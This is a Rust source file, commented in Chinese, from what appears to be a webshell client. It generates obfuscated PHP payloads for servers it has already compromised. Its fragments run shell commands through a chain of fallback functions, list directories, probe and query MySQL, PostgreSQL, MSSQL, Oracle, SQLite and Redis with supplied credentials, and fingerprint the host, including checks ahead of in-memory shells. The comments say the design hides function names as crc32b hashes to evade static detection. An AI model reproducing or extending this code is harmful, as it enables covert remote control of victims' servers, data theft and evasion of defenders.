//! session 处理器与 legacy 逐请求代码共用的 PHP 实现片段（OPSEC 版）。
//!
//! NATIVE stub（`encoder::NATIVE_STUB_TPL`）通过 `$_g[...]` 符号表调用敏感函数，
//! 以规避静态特征；本模块把这套做法下沉为**可复用片段**，供分阶段载荷处理器与
//! legacy 逐请求代码共用，保证三条通道的能力与静态特征处于同一水平。
//!
//! **符号表随代码自带**：NATIVE 的 `$_g` 由目标上已部署的 stub 构建，而分阶段
//! 处理器是每次连接由客户端注入的 —— 若依赖部署 stub 的表，旧 stub 就不认新索引。
//! 因此这里把 crc32b 哈希表直接写进生成的代码，运行时从 `get_defined_functions()`
//! 反查函数名；敏感函数名**不会**出现在代码里，被 `disable_functions` 禁用的函数
//! 自然缺席、对应槽位保持未设置。
//!
//! | 片段 | 读 | 写 |
//! |---|---|---|
//! | [`PHP_EXEC_IMPL`] | `$c` 命令、`$w` 工作目录 | `$ok` `$err` `$stdout`(base64) `$cwd` |
//! | [`PHP_SCAN_IMPL`] | `$p` 目录 | `$ok` `$err` `$entries` |
//! | [`PHP_DB_PROBE_IMPL`] | `$c` 连接 JSON | `$ok` `$err` `$driver` `$databases` |
//! | [`PHP_DB_QUERY_IMPL`] | `$c` 连接 JSON、`$q` SQL | `$ok` `$err` `$columns` `$rows` `$affected` |
//!
//! 所有片段都假定当前作用域里已有 `$__g`（运行时符号表），由调用方用
//! [`php_symbol_table`] 构建。

use crate::encoder::crc32b_hash;

/// 符号表条目：`(索引, 函数名)`。函数名只以 crc32b 哈希形式出现在生成的 PHP 里。
///
/// 索引与各片段里的 `$__g[N]` 一一对应；新增函数时**只能追加**，不要改动既有索引。
const SYMBOLS: &[(usize, &str)] = &[
    (0, "shell_exec"),
    (1, "exec"),
    (2, "system"),
    (3, "passthru"),
    (4, "popen"),
    (5, "base64_decode"),
    (6, "base64_encode"),
    (7, "file_get_contents"),
    (8, "file_put_contents"),
    (9, "scandir"),
    (10, "is_dir"),
    (11, "unlink"),
    (12, "rmdir"),
    (13, "rename"),
    (14, "mkdir"),
    (15, "getcwd"),
    (16, "chdir"),
    (17, "stream_socket_client"),
    (18, "fclose"),
    (19, "fwrite"),
    (20, "fgets"),
    (21, "fread"),
    (22, "preg_split"),
    (23, "gzdecode"),
    (24, "gzencode"),
    (25, "touch"),
    (26, "file_exists"),
    (27, "stream_get_contents"),
    (28, "pclose"),
    (29, "fopen"),
    (30, "fseek"),
];

/// 生成「运行时符号表」PHP 片段：`target` 为目标变量/表达式（如 `$__g`、
/// `$GLOBALS['x']`），片段把 index → 函数名 的映射写入其中。
///
/// 生成的代码不含任何敏感函数名（只有 crc32b 哈希），临时变量用完即清。
pub fn php_symbol_table(target: &str) -> String {
    let mut table = String::new();
    for (index, name) in SYMBOLS {
        table.push_str(&format!("'{}'=>{},", crc32b_hash(name), index));
    }
    format!(
        "{target}=array();$__dsft=array({table});$__dsff=@get_defined_functions();\
         $__dsff=isset($__dsff['internal'])?$__dsff['internal']:array();\
         foreach($__dsff as $__dsfn){{$__dsfh=hash('crc32b',$__dsfn);\
         if(isset($__dsft[$__dsfh])){{{target}[$__dsft[$__dsfh]]=$__dsfn;}}}}\
         unset($__dsft,$__dsff,$__dsfn,$__dsfh);\n"
    )
}

/// Redis RESP 解析辅助（`dsw_rsp` / `dsw_rcmd`），符号表由 `$g` 传入。
///
/// 以 `function_exists` 守卫定义：服务端 session 里驻留的处理器可能被重复注入。
/// 只在 redis 驱动路径使用；所需函数不可用时返回 `null`（不抛致命错误）。
pub const PHP_REDIS_HELPERS: &str = r#"if(!function_exists('dsw_rsp')){
function dsw_rsp($s,$g){if(!isset($g[20])||!isset($g[21]))return null;$line=@$g[20]($s);if($line===false)return null;$t=isset($line[0])?$line[0]:'';$data=substr($line,1);
if($t==='+')return array('s'=>trim($data));
if($t==='-')return array('e'=>trim($data));
if($t===':')return (int)trim($data);
if($t==='$'){$n=(int)trim($data);if($n===-1)return null;$v='';$left=$n;while($left>0){$chunk=@$g[21]($s,$left);if($chunk===false||$chunk==='')break;$v.=$chunk;$left-=strlen($chunk);}@$g[20]($s);return $v;}
if($t==='*'){$n=(int)trim($data);if($n===-1)return null;$arr=array();for($i=0;$i<$n;$i++){$arr[]=dsw_rsp($s,$g);}return $arr;}
return trim($data);}
function dsw_rcmd($s,$args,$g){if(!isset($g[19]))return null;$out='*'.count($args)."\r\n";foreach($args as $a){$out.='$'.strlen($a)."\r\n".$a."\r\n";}@$g[19]($s,$out);return dsw_rsp($s,$g);}
}
"#;

/// 命令执行：`cd` 前缀处理 + 命令函数降级链 + stderr 合并 + cwd 回传。
///
/// 降级链按符号表索引 0..4 依次探测（`shell_exec` / `exec` / `system` /
/// `passthru` / `popen`；`proc_open` 因 3 参数签名与单参数调用不兼容而排除）。
/// 代码里**不出现函数名**，比较的是整数索引；全部被 `disable_functions` 禁用时
/// 返回明确错误，而不是静默的空输出。
pub const PHP_EXEC_IMPL: &str = r#"$ok=true;$err='';$stdout='';$cwd='';
if($w!==''&&isset($__g[10])&&@$__g[10]($w)&&isset($__g[16])){@$__g[16]($w);}
if(preg_match('/^\s*cd\s+(\S+)/',$c,$__m)){if(isset($__g[16]))@$__g[16]($__m[1]);}
else{
$__fi=-1;
foreach(array(0,1,2,3,4) as $__i){if(isset($__g[$__i])&&function_exists($__g[$__i])){$__fi=$__i;break;}}
if($__fi<0){$ok=false;$err='no exec function available';}
else{
$__o='';$__l=array();
if($__fi===1){@$__g[1]($c.' 2>&1',$__l);$__o=implode("\n",$__l);}
elseif($__fi===2||$__fi===3){ob_start();@$__g[$__fi]($c.' 2>&1');$__o=ob_get_clean();}
elseif($__fi===4){$__p=@$__g[4]($c.' 2>&1','r');$__o=($__p&&isset($__g[27]))?@$__g[27]($__p):'';if($__p&&isset($__g[28]))@$__g[28]($__p);}
else{$__o=@$__g[0]($c.' 2>&1');}
$stdout=isset($__g[6])?@$__g[6]((string)$__o):'';
}
}
$cwd=isset($__g[15])?@$__g[15]():'';
"#;

/// 目录列举：**单次 `stat()`** 合并 `is_dir` / `size` / `mtime` / `perms`。
///
/// `scandir` 走符号表；`stat` / `sprintf` / `substr` 与 NATIVE stub 保持同一水平
/// （明文，非高风险特征）。`stat()` 会跟随符号链接，与 `is_dir()` 语义一致。
pub const PHP_SCAN_IMPL: &str = r#"$ok=true;$err='';$entries=array();
$__items=isset($__g[9])?@$__g[9]($p):false;
if($__items===false){$ok=false;$err='read dir failed';}
else{
foreach($__items as $__f){
if($__f==='.'||$__f==='..')continue;
$__full=rtrim($p,'/\\').DIRECTORY_SEPARATOR.$__f;
$__s=@stat($__full);
$__isd=($__s!==false)&&(($__s['mode']&0170000)===0040000);
$entries[]=array('name'=>$__f,'path'=>$__full,'is_dir'=>$__isd,'size'=>($__isd||$__s===false)?0:$__s['size'],'mtime'=>($__s===false)?0:$__s['mtime'],'perms'=>($__s===false)?'':substr(sprintf('%o',$__s['mode']&0777),-3));
}
}
"#;

/// 数据库探测：6 驱动（mysql / pgsql / sqlite / mssql / oracle / redis）+ 列库。
///
/// 与 NATIVE stub 的 `__DBP__` 逐条对齐：mssql 三 DSN 回退（sqlsrv → dblib → odbc）、
/// oracle `oci:`、redis 裸 RESP（AUTH + PING）、sqlite 直接把 dbname 当文件路径。
/// redis 的网络函数经符号表调用。
pub const PHP_DB_PROBE_IMPL: &str = r#"$ok=false;$err='bad conn';$driver='';$databases=array();
$__p=@json_decode($c,true);
if(is_array($__p)){
$driver=isset($__p['driver'])?(string)$__p['driver']:'';
$__host=isset($__p['host'])?(string)$__p['host']:'';
$__port=isset($__p['port'])?(int)$__p['port']:0;
$__user=isset($__p['username'])?(string)$__p['username']:'';
$__pass=isset($__p['password'])?(string)$__p['password']:'';
$__db=isset($__p['dbname'])?(string)$__p['dbname']:'';
if($driver==='redis'){
$__s=isset($__g[17])?@$__g[17]('tcp://'.$__host.':'.($__port?$__port:6379),$__e1,$__e2,5):false;
if(!$__s){$err='redis connect failed';}
else{
if($__pass!==''){dsw_rcmd($__s,array('AUTH',$__pass),$__g);}
$__pong=dsw_rcmd($__s,array('PING'),$__g);
if(is_array($__pong)&&isset($__pong['e'])){$err='redis auth failed';}
else{$ok=true;for($__i=0;$__i<16;$__i++){$databases[]=(string)$__i;}}
if(isset($__g[18]))@$__g[18]($__s);
}
}
elseif(!class_exists('PDO')){$err='no pdo';}
else{
try{
if($driver==='mssql'){
$__port=$__port?$__port:1433;
$__dsns=array('sqlsrv:Server='.$__host.','.$__port.';Database='.$__db,'dblib:host='.$__host.':'.$__port.';dbname='.$__db,'odbc:Driver={ODBC Driver 17 for SQL Server};Server='.$__host.','.$__port.';Database='.$__db);
$__h=null;$__last='';
foreach($__dsns as $__d){try{$__h=new PDO($__d,$__user,$__pass,array(PDO::ATTR_TIMEOUT=>5,PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));break;}catch(Exception $__x){$__last=$__x->getMessage();}}
if(!$__h){$err='mssql: '.$__last;}
else{foreach($__h->query('SELECT name FROM sys.databases') as $__r){$databases[]=$__r[0];}$ok=true;}
}
elseif($driver==='oracle'){
$__port=$__port?$__port:1521;
$__h=new PDO('oci:dbname=//'.$__host.':'.$__port.'/'.($__db!==''?$__db:'ORCL'),$__user,$__pass,array(PDO::ATTR_TIMEOUT=>5,PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));
foreach($__h->query('SELECT username FROM all_users') as $__r){$databases[]=$__r[0];}
$ok=true;
}
else{
$__dsn=$driver==='pgsql'?('pgsql:host='.$__host.';port='.($__port?$__port:5432).';dbname='.($__db!==''?$__db:'postgres')):($driver==='sqlite'?('sqlite:'.$__db):('mysql:host='.$__host.';port='.($__port?$__port:3306).';charset=utf8mb4'));
$__h=new PDO($__dsn,$__user,$__pass,array(PDO::ATTR_TIMEOUT=>5,PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));
if($driver==='sqlite'){$databases[]=$__db;}
elseif($driver==='pgsql'){foreach($__h->query('SELECT datname FROM pg_database') as $__r){$databases[]=$__r[0];}}
else{foreach($__h->query('SHOW DATABASES') as $__r){$databases[]=$__r[0];}}
$ok=true;
}
}catch(Exception $__e){$err=$__e->getMessage();}
}
}
"#;

/// 数据库查询：6 驱动 + 结果集（列/行，1000 行上限）/ 影响行数。
///
/// SELECT 判定正则与 NATIVE stub 的 `__DBQ__` 一致（含 `exec`，覆盖 mssql 的
/// `EXEC` 存储过程调用）；列名缺失时回退 `col{i}`。redis 命令解析与网络调用
/// 经符号表。
pub const PHP_DB_QUERY_IMPL: &str = r#"$ok=false;$err='bad conn';$columns=array();$rows=array();$affected=0;
$__p=@json_decode($c,true);
if(is_array($__p)){
$__driver=isset($__p['driver'])?(string)$__p['driver']:'';
$__host=isset($__p['host'])?(string)$__p['host']:'';
$__port=isset($__p['port'])?(int)$__p['port']:0;
$__user=isset($__p['username'])?(string)$__p['username']:'';
$__pass=isset($__p['password'])?(string)$__p['password']:'';
$__db=isset($__p['dbname'])?(string)$__p['dbname']:'';
if($__driver==='redis'){
$__s=isset($__g[17])?@$__g[17]('tcp://'.$__host.':'.($__port?$__port:6379),$__e1,$__e2,5):false;
if(!$__s){$err='redis connect failed';}
else{
if($__pass!==''){dsw_rcmd($__s,array('AUTH',$__pass),$__g);}
$__args=isset($__g[22])?@$__g[22]('/\s+/',trim((string)$q)):array();
if(count($__args)===0||$__args[0]===''){$err='empty command';}
else{
$__res=dsw_rcmd($__s,$__args,$__g);
if(is_array($__res)&&isset($__res['e'])){$err=$__res['e'];}
else{
$columns=array('value');
if(is_array($__res)){foreach($__res as $__v){$rows[]=array(is_array($__v)?implode(',',array_map('strval',$__v)):($__v===null?null:(string)$__v));}}
else{$rows[]=array($__res===null?null:(string)$__res);}
$ok=true;
}
}
if(isset($__g[18]))@$__g[18]($__s);
}
}
elseif(!class_exists('PDO')){$err='no pdo';}
else{
try{
if($__driver==='mssql'){
$__port=$__port?$__port:1433;
$__dsns=array('sqlsrv:Server='.$__host.','.$__port.';Database='.$__db,'dblib:host='.$__host.':'.$__port.';dbname='.$__db,'odbc:Driver={ODBC Driver 17 for SQL Server};Server='.$__host.','.$__port.';Database='.$__db);
$__h=null;$__last='';
foreach($__dsns as $__d){try{$__h=new PDO($__d,$__user,$__pass,array(PDO::ATTR_TIMEOUT=>5,PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));break;}catch(Exception $__x){$__last=$__x->getMessage();}}
if(!$__h){$err='mssql: '.$__last;}
}
elseif($__driver==='oracle'){
$__port=$__port?$__port:1521;
$__h=new PDO('oci:dbname=//'.$__host.':'.$__port.'/'.($__db!==''?$__db:'ORCL'),$__user,$__pass,array(PDO::ATTR_TIMEOUT=>5,PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));
}
else{
$__dsn=$__driver==='pgsql'?('pgsql:host='.$__host.';port='.($__port?$__port:5432).';dbname='.($__db!==''?$__db:'postgres')):($__driver==='sqlite'?('sqlite:'.$__db):('mysql:host='.$__host.';port='.($__port?$__port:3306).';charset=utf8mb4'.($__db!==''?';dbname='.$__db:'')));
$__h=new PDO($__dsn,$__user,$__pass,array(PDO::ATTR_TIMEOUT=>5,PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));
}
if(isset($__h)&&$__h){
$__st=$__h->query($q);
if($__st===false){$err='query failed';}
elseif(preg_match('/^\s*(select|show|desc|describe|explain|pragma|with|exec)\b/i',$q)){
$__nc=$__st->columnCount();
for($__i=0;$__i<$__nc;$__i++){$__m=$__st->getColumnMeta($__i);$columns[]=(isset($__m['name'])&&$__m['name']!=='')?$__m['name']:('col'.$__i);}
$__cnt=0;
while(($__row=$__st->fetch(PDO::FETCH_NUM))!==false&&$__cnt<1000){$__cells=array();foreach($__row as $__v){$__cells[]=($__v===null)?null:(string)$__v;}$rows[]=$__cells;$__cnt++;}
$ok=true;
}
else{$affected=$__st->rowCount();$ok=true;}
}
}catch(Exception $__e){$err=$__e->getMessage();}
}
}
"#;

/// 环境信息表：`$info`（写入 `data.info`，供客户端 `info_map` / 能力协商 /
/// 内存马前置判定使用）。
///
/// 键集与 NATIVE stub 的 `__ENV__` 保持一致（`ProtoVersion` / `Capabilities` /
/// `ShellType` / `PHP_SAPI` / `user_ini_filename` / `DOCUMENT_ROOT` 等）——
/// 内存马前置判定与能力协商都依赖它，缺了会让 session/legacy 通道"看起来不支持"。
/// 这里保留的明文函数（`ini_get` / `getenv` / `php_uname` 等）与 NATIVE stub 同级，
/// 均非高风险特征。
pub const PHP_INFO_IMPL: &str = r#"$info=array(
'ChunkedTransfer'=>'1',
'ProtoVersion'=>'2',
'Capabilities'=>'chunked,stream,db,plugin,exec,gzip_plain',
'ShellType'=>'file',
'OsInfo'=>@php_uname('s').' '.@php_uname('r').' '.@php_uname('m'),
'CurrentUser'=>''.@get_current_user(),
'REMOTE_ADDR'=>''.@$_SERVER['REMOTE_ADDR'],
'REMOTE_PORT'=>''.@$_SERVER['REMOTE_PORT'],
'HTTP_X_FORWARDED_FOR'=>''.@$_SERVER['HTTP_X_FORWARDED_FOR'],
'HTTP_CLIENT_IP'=>''.@$_SERVER['HTTP_CLIENT_IP'],
'SERVER_ADDR'=>''.@$_SERVER['SERVER_ADDR'],
'SERVER_NAME'=>''.@$_SERVER['SERVER_NAME'],
'SERVER_PORT'=>''.@$_SERVER['SERVER_PORT'],
'disable_functions'=>''.@ini_get('disable_functions'),
'Open_basedir'=>''.@ini_get('open_basedir'),
'timezone'=>''.@date_default_timezone_get(),
'encode'=>''.@ini_get('default_charset'),
'extension_dir'=>''.@ini_get('extension_dir'),
'Path'=>''.@getenv('PATH'),
'PATHEXT'=>''.@getenv('PATHEXT'),
'APPDATA'=>''.@getenv('APPDATA'),
'systempdir'=>''.@sys_get_temp_dir().'/',
'include_path'=>''.@ini_get('include_path'),
'DOCUMENT_ROOT'=>''.@$_SERVER['DOCUMENT_ROOT'],
'PHP_SAPI'=>PHP_SAPI,
'PHP_VERSION'=>PHP_VERSION,
'PHP_INT_SIZE'=>PHP_INT_SIZE,
'ProcessArch'=>(PHP_INT_SIZE===8?'x64':'x86'),
'PHP_OS'=>PHP_OS,
'canCallGzipDecode'=>isset($__g[23])?1:0,
'canCallGzipEncode'=>isset($__g[24])?1:0,
'session_name'=>''.@session_name(),
'session_save_path'=>''.@ini_get('session.save_path'),
'session_save_handler'=>''.@ini_get('session.save_handler'),
'session_serialize_handler'=>''.@ini_get('session.serialize_handler'),
'user_ini_filename'=>''.@ini_get('user.ini.filename'),
'memory_limit'=>''.@ini_get('memory_limit'),
'upload_max_filesize'=>''.@ini_get('upload_max_filesize'),
'post_max_size'=>''.@ini_get('post_max_size'),
'max_execution_time'=>''.@ini_get('max_execution_time'),
'max_input_time'=>''.@ini_get('max_input_time'),
'default_socket_timeout'=>''.@ini_get('default_socket_timeout'),
'mygid'=>function_exists('posix_getgid')?''.@posix_getgid():'',
'mypid'=>''.@getmypid(),
'SERVER_SOFTWARE'=>''.@$_SERVER['SERVER_SOFTWARE'],
'loaded_extensions'=>implode(',',@get_loaded_extensions()),
'short_open_tag'=>''.@ini_get('short_open_tag'),
'asp_tags'=>''.@ini_get('asp_tags'),
'safe_mode'=>''.@ini_get('safe_mode'),
'CurrentDir'=>@getcwd(),
'FileRoot'=>''.@$_SERVER['DOCUMENT_ROOT']
);
"#;
